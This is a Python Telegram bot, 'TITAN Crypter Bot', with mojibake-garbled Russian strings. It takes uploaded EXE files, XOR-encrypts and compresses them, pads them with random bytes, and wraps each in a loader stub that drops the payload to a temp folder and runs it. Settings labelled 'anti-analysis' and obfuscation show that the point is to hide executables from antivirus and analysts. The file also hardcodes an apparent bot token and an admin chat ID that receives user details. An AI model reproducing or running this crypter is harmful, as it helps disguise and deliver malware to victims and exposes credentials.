import os
import logging
import telebot
from telebot import types
from telebot.async_telebot import AsyncTeleBot
import asyncio
import threading
from datetime import datetime
import tempfile
import shutil
import random
import zlib
import base64

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –±–æ—Ç–∞
BOT_TOKEN = "7645055602:AAH82SESEjhY6EjfoxNCgYew-SiJJbR6oB4"
ADMIN_CHAT_ID = 4922949598

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# –£–ø—Ä–æ—â–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è –∫—Ä–∏–ø—Ç–µ—Ä–∞ –¥–ª—è –±–æ—Ç–∞
class SimpleCrypter:
    def __init__(self):
        self.obfuscation_level = 30
        self.anti_analysis_enabled = True
        
    def simple_xor_encrypt(self, data, key):
        """–ü—Ä–æ—Å—Ç–æ–µ XOR —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ"""
        return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
    
    def compress_data(self, data):
        """–°–∂–∞—Ç–∏–µ –¥–∞–Ω–Ω—ã—Ö"""
        return zlib.compress(data)
    
    def obfuscate_data(self, data):
        """–ë–∞–∑–æ–≤–∞—è –æ–±—Ñ—É—Å–∫–∞—Ü–∏—è"""
        header = os.urandom(random.randint(10, 50))
        footer = os.urandom(random.randint(10, 50))
        return header + data + footer
    
    def create_loader_stub(self, encrypted_data, password):
        """–°–æ–∑–¥–∞–Ω–∏–µ –∑–∞–≥—Ä—É–∑—á–∏–∫–∞"""
        loader_template = f'''
import zlib
import base64
import os
import tempfile
import subprocess
import sys

ENC_DATA = b"{base64.b64encode(encrypted_data).decode()}"
PASSWORD = b"{password}"

def decrypt_data(data, key):
    return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))

def main():
    try:
        compressed_data = decrypt_data(base64.b64decode(ENC_DATA), PASSWORD)
        original_data = zlib.decompress(compressed_data)
        
        temp_dir = tempfile.gettempdir()
        temp_file = os.path.join(temp_dir, "temp_executable.exe")
        
        with open(temp_file, "wb") as f:
            f.write(original_data)
        
        subprocess.Popen([temp_file], shell=True)
        
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    main()
'''
        return loader_template
    
    def protect_file(self, input_path, output_path, extension='.exe'):
        """–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –∑–∞—â–∏—Ç—ã —Ñ–∞–π–ª–∞"""
        try:
            with open(input_path, 'rb') as f:
                original_data = f.read()
            
            password = os.urandom(32)
            compressed_data = self.compress_data(original_data)
            encrypted_data = self.simple_xor_encrypt(compressed_data, password)
            
            if self.obfuscation_level > 10:
                encrypted_data = self.obfuscate_data(encrypted_data)
            
            if extension == '.exe':
                loader_code = self.create_loader_stub(encrypted_data, password)
                
                with open(output_path, 'w', encoding='utf-8') as f:
                    f.write(loader_code)
                
                return True, "–§–∞–π–ª –∑–∞—â–∏—â–µ–Ω —É—Å–ø–µ—à–Ω–æ"
            else:
                with open(output_path, 'wb') as f:
                    f.write(encrypted_data)
                
                return True, "–§–∞–π–ª –∑–∞—â–∏—â–µ–Ω —É—Å–ø–µ—à–Ω–æ"
                
        except Exception as e:
            return False, f"–û—à–∏–±–∫–∞: {str(e)}"

class TitanCrypterBot:
    def __init__(self):
        self.bot = telebot.TeleBot(BOT_TOKEN)
        self.user_sessions = {}
        self.crypter = SimpleCrypter()
        self.setup_handlers()
        
    def setup_handlers(self):
        """–ù–∞—Å—Ç—Ä–æ–π–∫–∞ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤ –∫–æ–º–∞–Ω–¥"""
        @self.bot.message_handler(commands=['start'])
        def start_handler(message):
            asyncio.run(self.start(message))
            
        @self.bot.message_handler(commands=['help'])
        def help_handler(message):
            asyncio.run(self.help_command(message))
            
        @self.bot.message_handler(content_types=['document'])
        def document_handler(message):
            asyncio.run(self.handle_document(message))
            
        @self.bot.message_handler(func=lambda message: True)
        def message_handler(message):
            asyncio.run(self.handle_message(message))
            
        @self.bot.callback_query_handler(func=lambda call: True)
        def callback_handler(call):
            asyncio.run(self.button_handler(call))

    async def notify_admin(self, message: str):
        """–û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É"""
        try:
            await self.bot.send_message(
                ADMIN_CHAT_ID,
                message,
                parse_mode='HTML'
            )
            logger.info("–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –∞–¥–º–∏–Ω—É")
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –∞–¥–º–∏–Ω—É: {e}")

    async def start(self, message):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /start"""
        try:
            user = message.from_user
            chat_id = message.chat.id
            
            logger.info(f"–ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {user.id} - {user.first_name}")
            
            user_info = (
                f"üÜï <b>–ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</b>\n"
                f"üë§ ID: {user.id}\n"
                f"üìõ –ò–º—è: {user.first_name}\n"
                f"üì± Username: @{user.username if user.username else 'N/A'}\n"
                f"üïê –í—Ä–µ–º—è: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            await self.notify_admin(user_info)
            
            self.user_sessions[chat_id] = {
                'step': 'main_menu',
                'file_path': None,
                'user_info': f"{user.first_name} (@{user.username})" if user.username else user.first_name,
                'settings': {
                    'obfuscation_level': 20,
                    'extension': '.exe',
                    'anti_analysis': True
                }
            }
            
            keyboard = types.InlineKeyboardMarkup()
            keyboard.add(
                types.InlineKeyboardButton("üìÅ –ó–∞–≥—Ä—É–∑–∏—Ç—å EXE —Ñ–∞–π–ª", callback_data="upload_file"),
                types.InlineKeyboardButton("‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏", callback_data="settings"),
                types.InlineKeyboardButton("‚ùì –ü–æ–º–æ—â—å", callback_data="help")
            )
            
            await self.bot.send_message(
                chat_id,
                "üîí <b>TITAN Crypter Bot</b>\n\n"
                "–ü—Ä–æ—Ñ–µ—Å—Å–∏–æ–Ω–∞–ª—å–Ω—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –∑–∞—â–∏—Ç—ã –∏—Å–ø–æ–ª–Ω—è–µ–º—ã—Ö —Ñ–∞–π–ª–æ–≤\n\n"
                "–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:",
                reply_markup=keyboard,
                parse_mode='HTML'
            )
            
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –≤ start: {e}")
            await self.bot.send_message(message.chat.id, "‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.")

    async def help_command(self, message):
        """–ö–æ–º–∞–Ω–¥–∞ –ø–æ–º–æ—â–∏"""
        help_text = (
            "ü§ñ <b>TITAN Crypter Bot - –ü–æ–º–æ—â—å</b>\n\n"
            "üìÅ <b>–ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:</b>\n"
            "1. –ù–∞–∂–º–∏—Ç–µ '–ó–∞–≥—Ä—É–∑–∏—Ç—å EXE —Ñ–∞–π–ª'\n"
            "2. –û—Ç–ø—Ä–∞–≤—å—Ç–µ EXE —Ñ–∞–π–ª –±–æ—Ç—É\n"
            "3. –ù–∞—Å—Ç—Ä–æ–π—Ç–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –∑–∞—â–∏—Ç—ã\n"
            "4. –ó–∞–ø—É—Å—Ç–∏—Ç–µ –ø—Ä–æ—Ü–µ—Å—Å –∑–∞—â–∏—Ç—ã\n\n"
            "‚öôÔ∏è <b>–ù–∞—Å—Ç—Ä–æ–π–∫–∏:</b>\n"
            "‚Ä¢ –£—Ä–æ–≤–µ–Ω—å –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏\n"
            "‚Ä¢ –†–∞—Å—à–∏—Ä–µ–Ω–∏–µ –≤—ã—Ö–æ–¥–Ω–æ–≥–æ —Ñ–∞–π–ª–∞\n"
            "‚Ä¢ –ê–Ω—Ç–∏-–∞–Ω–∞–ª–∏–∑\n\n"
            "‚ö†Ô∏è <b>–í–Ω–∏–º–∞–Ω–∏–µ:</b> –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –¥–ª—è –ª–µ–≥–∞–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π!"
        )
        
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(types.InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data="main_menu"))
        
        await self.bot.send_message(message.chat.id, help_text, reply_markup=keyboard, parse_mode='HTML')

    async def handle_document(self, message):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω–æ–≥–æ —Ñ–∞–π–ª–∞"""
        try:
            chat_id = message.chat.id
            user = message.from_user
            
            if chat_id not in self.user_sessions:
                await self.bot.send_message(chat_id, "‚ùå –°–Ω–∞—á–∞–ª–∞ –∑–∞–ø—É—Å—Ç–∏—Ç–µ –±–æ—Ç–∞ –∫–æ–º–∞–Ω–¥–æ–π /start")
                return
                
            document = message.document
            file_name = document.file_name or "unknown.exe"
            
            if not file_name.lower().endswith('.exe'):
                await self.bot.send_message(chat_id, "‚ùå –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞—é—Ç—Å—è —Ç–æ–ª—å–∫–æ EXE —Ñ–∞–π–ª—ã!")
                return
                
            if document.file_size > 20 * 1024 * 1024:
                await self.bot.send_message(chat_id, "‚ùå –§–∞–π–ª —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π! –ú–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–π —Ä–∞–∑–º–µ—Ä: 20MB")
                return
            
            file_info = await self.bot.get_file(document.file_id)
            temp_dir = tempfile.mkdtemp()
            file_path = os.path.join(temp_dir, file_name)
            
            downloaded_file = await self.bot.download_file(file_info.file_path)
            with open(file_path, 'wb') as f:
                f.write(downloaded_file)
            
            try:
                with open(file_path, 'rb') as f:
                    header = f.read(2)
                    if header != b'MZ':
                        await self.bot.send_message(chat_id, "‚ùå –≠—Ç–æ –Ω–µ –≤–∞–ª–∏–¥–Ω—ã–π EXE —Ñ–∞–π–ª!")
                        shutil.rmtree(temp_dir)
                        return
            except:
                await self.bot.send_message(chat_id, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ñ–∞–π–ª–∞!")
                shutil.rmtree(temp_dir)
                return
            
            self.user_sessions[chat_id]['file_path'] = file_path
            self.user_sessions[chat_id]['step'] = 'file_uploaded'
            
            action_info = (
                f"üì• <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–≥—Ä—É–∑–∏–ª —Ñ–∞–π–ª</b>\n"
                f"üë§ ID: {user.id}\n"
                f"üìõ –ò–º—è: {user.first_name}\n"
                f"üìÑ –§–∞–π–ª: {file_name}\n"
                f"üìè –†–∞–∑–º–µ—Ä: {document.file_size} –±–∞–π—Ç\n"
                f"üïê –í—Ä–µ–º—è: {datetime.now().strftime('%H:%M:%S')}"
            )
            await self.notify_admin(action_info)
            
            keyboard = types.InlineKeyboardMarkup()
            keyboard.add(
                types.InlineKeyboardButton("‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–∏—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä—ã", callback_data="configure"),
                types.InlineKeyboardButton("üîí –ó–∞–ø—É—Å—Ç–∏—Ç—å –∑–∞—â–∏—Ç—É", callback_data="protect"),
                types.InlineKeyboardButton("üìÅ –ó–∞–≥—Ä—É–∑–∏—Ç—å –¥—Ä—É–≥–æ–π —Ñ–∞–π–ª", callback_data="upload_file"),
                types.InlineKeyboardButton("üîô –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é", callback_data="main_menu")
            )
            
            await self.bot.send_message(
                chat_id,
                f"‚úÖ <b>–§–∞–π–ª —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω!</b>\n\n"
                f"üìÑ –ò–º—è: {file_name}\n"
                f"üìè –†–∞–∑–º–µ—Ä: {document.file_size} –±–∞–π—Ç\n\n"
                "–¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –∑–∞—â–∏—Ç—ã –∏–ª–∏ —Å—Ä–∞–∑—É –∑–∞–ø—É—Å—Ç–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å:",
                reply_markup=keyboard,
                parse_mode='HTML'
            )
            
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –¥–æ–∫—É–º–µ–Ω—Ç–∞: {e}")
            await self.bot.send_message(message.chat.id, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Ñ–∞–π–ª–∞!")

    async def handle_message(self, message):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ —Ç–µ–∫—Å—Ç–æ–≤—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π"""
        chat_id = message.chat.id
        text = message.text
        
        if chat_id in self.user_sessions:
            if self.user_sessions[chat_id]['step'] == 'waiting_obfuscation':
                try:
                    level = int(text)
                    if 1 <= level <= 30:
                        self.user_sessions[chat_id]['settings']['obfuscation_level'] = level
                        self.user_sessions[chat_id]['step'] = 'file_uploaded'
                        await self.bot.send_message(chat_id, f"‚úÖ –£—Ä–æ–≤–µ–Ω—å –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω: {level}")
                    else:
                        await self.bot.send_message(chat_id, "‚ùå –í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –æ—Ç 1 –¥–æ 30")
                except:
                    await self.bot.send_message(chat_id, "‚ùå –í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ —á–∏—Å–ª–æ")

    async def show_settings(self, call):
        """–ü–æ–∫–∞–∑–∞—Ç—å –Ω–∞—Å—Ç—Ä–æ–π–∫–∏"""
        try:
            chat_id = call.message.chat.id
            if chat_id not in self.user_sessions:
                return
                
            settings = self.user_sessions[chat_id]['settings']
            
            settings_text = (
                "‚öôÔ∏è <b>–ù–∞—Å—Ç—Ä–æ–π–∫–∏ –∑–∞—â–∏—Ç—ã</b>\n\n"
                f"üî¢ –£—Ä–æ–≤–µ–Ω—å –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏: <b>{settings['obfuscation_level']}/30</b>\n"
                f"üìÅ –†–∞—Å—à–∏—Ä–µ–Ω–∏–µ: <b>{settings['extension']}</b>\n"
                f"üîç –ê–Ω—Ç–∏-–∞–Ω–∞–ª–∏–∑: <b>{'–í–∫–ª—é—á–µ–Ω–æ' if settings['anti_analysis'] else '–í—ã–∫–ª—é—á–µ–Ω–æ'}</b>"
            )
            
            keyboard = types.InlineKeyboardMarkup()
            keyboard.add(
                types.InlineKeyboardButton("üî¢ –£—Ä–æ–≤–µ–Ω—å –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏", callback_data="set_obfuscation"),
                types.InlineKeyboardButton("üìÅ –†–∞—Å—à–∏—Ä–µ–Ω–∏–µ", callback_data="set_extension")
            )
            keyboard.add(
                types.InlineKeyboardButton("üîç –ê–Ω—Ç–∏-–∞–Ω–∞–ª–∏–∑", callback_data="toggle_anti_analysis"),
                types.InlineKeyboardButton("üíæ –°–æ—Ö—Ä–∞–Ω–∏—Ç—å", callback_data="save_settings")
            )
            keyboard.add(types.InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data="main_menu"))
            
            await self.bot.edit_message_text(
                settings_text,
                chat_id,
                call.message.message_id,
                reply_markup=keyboard,
                parse_mode='HTML'
            )
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –≤ show_settings: {e}")

    async def process_protection(self, chat_id: int):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞—â–∏—Ç—ã —Ñ–∞–π–ª–∞"""
        try:
            session = self.user_sessions.get(chat_id)
            if not session:
                await self.bot.send_message(chat_id, "‚ùå –°–µ—Å—Å–∏—è —É—Å—Ç–∞—Ä–µ–ª–∞! –ù–∞—á–Ω–∏—Ç–µ —Å /start")
                return
                
            file_path = session.get('file_path')
            
            if not file_path or not os.path.exists(file_path):
                await self.bot.send_message(chat_id, "‚ùå –§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω! –ó–∞–≥—Ä—É–∑–∏—Ç–µ —Ñ–∞–π–ª –∑–∞–Ω–æ–≤–æ.")
                return
            
            settings = session['settings']
            
            self.crypter.obfuscation_level = settings['obfuscation_level']
            self.crypter.anti_analysis_enabled = settings['anti_analysis']
            
            output_filename = f"protected_{datetime.now().strftime('%H%M%S')}{settings['extension']}"
            output_path = os.path.join(tempfile.gettempdir(), output_filename)
            
            progress_messages = [
                "üîÑ –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ñ–∞–π–ª–∞...",
                "üìñ –ß—Ç–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö...",
                "üîí –®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ...",
                "üì¶ –°–∂–∞—Ç–∏–µ...",
                "üöÄ –°–æ–∑–¥–∞–Ω–∏–µ –∑–∞—â–∏—Ç—ã...",
                "‚úÖ –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ..."
            ]
            
            for i, message in enumerate(progress_messages):
                progress = (i + 1) * 20
                await self.bot.send_message(chat_id, f"{message} ({progress}%)")
                await asyncio.sleep(1)
            
            success, result_message = self.crypter.protect_file(file_path, output_path, settings['extension'])
            
            if success and os.path.exists(output_path):
                file_size = os.path.getsize(output_path)
                
                with open(output_path, 'rb') as f:
                    await self.bot.send_document(
                        chat_id,
                        f,
                        caption=(
                            f"‚úÖ <b>–§–∞–π–ª —É—Å–ø–µ—à–Ω–æ –∑–∞—â–∏—â–µ–Ω!</b>\n\n"
                            f"üìÅ –†–∞—Å—à–∏—Ä–µ–Ω–∏–µ: {settings['extension']}\n"
                            f"üî¢ –£—Ä–æ–≤–µ–Ω—å –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏: {settings['obfuscation_level']}/30\n"
                            f"üìè –†–∞–∑–º–µ—Ä: {file_size} –±–∞–π—Ç"
                        ),
                        visible_file_name=output_filename,
                        parse_mode='HTML'
                    )
                
                user_info = session.get('user_info', 'Unknown')
                action_info = (
                    f"üîí <b>–£—Å–ø–µ—à–Ω–∞—è –∑–∞—â–∏—Ç–∞ —Ñ–∞–π–ª–∞</b>\n"
                    f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {user_info}\n"
                    f"üë§ ID: {chat_id}\n"
                    f"üìÑ –§–∞–π–ª: {output_filename}\n"
                    f"üìè –†–∞–∑–º–µ—Ä: {file_size} –±–∞–π—Ç\n"
                    f"üïê –í—Ä–µ–º—è: {datetime.now().strftime('%H:%M:%S')}"
                )
                await self.notify_admin(action_info)
                
            else:
                await self.bot.send_message(chat_id, f"‚ùå –û—à–∏–±–∫–∞: {result_message}")
                
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Ñ–∞–π–ª–∞: {e}")
            await self.bot.send_message(chat_id, f"‚ùå –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: {str(e)}")
        finally:
            try:
                session = self.user_sessions.get(chat_id)
                if session and session.get('file_path'):
                    file_dir = os.path.dirname(session['file_path'])
                    if file_dir and os.path.exists(file_dir):
                        shutil.rmtree(file_dir)
            except Exception as e:
                logger.error(f"–û—à–∏–±–∫–∞ –æ—á–∏—Å—Ç–∫–∏ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤: {e}")

    async def button_handler(self, call):
        """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–∞–∂–∞—Ç–∏–π –Ω–∞ –∫–Ω–æ–ø–∫–∏"""
        try:
            chat_id = call.message.chat.id
            data = call.data
            
            if chat_id not in self.user_sessions:
                self.user_sessions[chat_id] = {
                    'step': 'main_menu', 
                    'settings': {
                        'obfuscation_level': 20,
                        'extension': '.exe',
                        'anti_analysis': True
                    }
                }
            
            if data == "main_menu":
                keyboard = types.InlineKeyboardMarkup()
                keyboard.add(
                    types.InlineKeyboardButton("üìÅ –ó–∞–≥—Ä—É–∑–∏—Ç—å EXE —Ñ–∞–π–ª", callback_data="upload_file"),
                    types.InlineKeyboardButton("‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏", callback_data="settings"),
                    types.InlineKeyboardButton("‚ùì –ü–æ–º–æ—â—å", callback_data="help")
                )
                
                await self.bot.edit_message_text(
                    "üîí <b>TITAN Crypter Bot</b>\n\n–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:",
                    chat_id,
                    call.message.message_id,
                    reply_markup=keyboard,
                    parse_mode='HTML'
                )
                
            elif data == "upload_file":
                await self.bot.edit_message_text(
                    "üìÅ <b>–ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–∞</b>\n\n"
                    "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ EXE —Ñ–∞–π–ª –∫–∞–∫ –¥–æ–∫—É–º–µ–Ω—Ç:",
                    chat_id,
                    call.message.message_id,
                    parse_mode='HTML'
                )
                
            elif data == "settings":
                await self.show_settings(call)
                
            elif data == "help":
                await self.help_command(call.message)
                
            elif data == "configure":
                await self.show_settings(call)
                
            elif data == "protect":
                if not self.user_sessions[chat_id].get('file_path'):
                    await self.bot.answer_callback_query(call.id, "‚ùå –°–Ω–∞—á–∞–ª–∞ –∑–∞–≥—Ä—É–∑–∏—Ç–µ —Ñ–∞–π–ª!")
                    return
                    
                await self.bot.edit_message_text(
                    "üöÄ –ó–∞–ø—É—Å–∫ –∑–∞—â–∏—Ç—ã...",
                    chat_id,
                    call.message.message_id
                )
                
                await self.process_protection(chat_id)
                
            elif data == "toggle_anti_analysis":
                current = self.user_sessions[chat_id]['settings']['anti_analysis']
                self.user_sessions[chat_id]['settings']['anti_analysis'] = not current
                status = "–≤–∫–ª—é—á–µ–Ω" if not current else "–≤—ã–∫–ª—é—á–µ–Ω"
                await self.bot.answer_callback_query(call.id, f"‚úÖ –ê–Ω—Ç–∏-–∞–Ω–∞–ª–∏–∑ {status}")
                await asyncio.sleep(1)
                await self.show_settings(call)
                
            elif data == "save_settings":
                await self.bot.answer_callback_query(call.id, "‚úÖ –ù–∞—Å—Ç—Ä–æ–π–∫–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã!")
                
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –≤ button_handler: {e}")

    def run(self):
        """–ó–∞–ø—É—Å–∫ –±–æ—Ç–∞"""
        try:
            logger.info("–ë–æ—Ç –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è...")
            print("Titan Crypter Bot –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è...")
            print(f"–¢–æ–∫–µ–Ω: {BOT_TOKEN}")
            print(f"Admin ID: {ADMIN_CHAT_ID}")
            
            self.bot.infinity_polling()
            
        except KeyboardInterrupt:
            logger.info("–ë–æ—Ç –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
            print("\n–ë–æ—Ç –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")
        except Exception as e:
            logger.error(f"–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ: {e}")
            print(f"–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: {e}")

if __name__ == "__main__":
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("‚ùå –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ —Ç–æ–∫–µ–Ω –±–æ—Ç–∞!")
        exit(1)
        
    bot = TitanCrypterBot()
    bot.run()
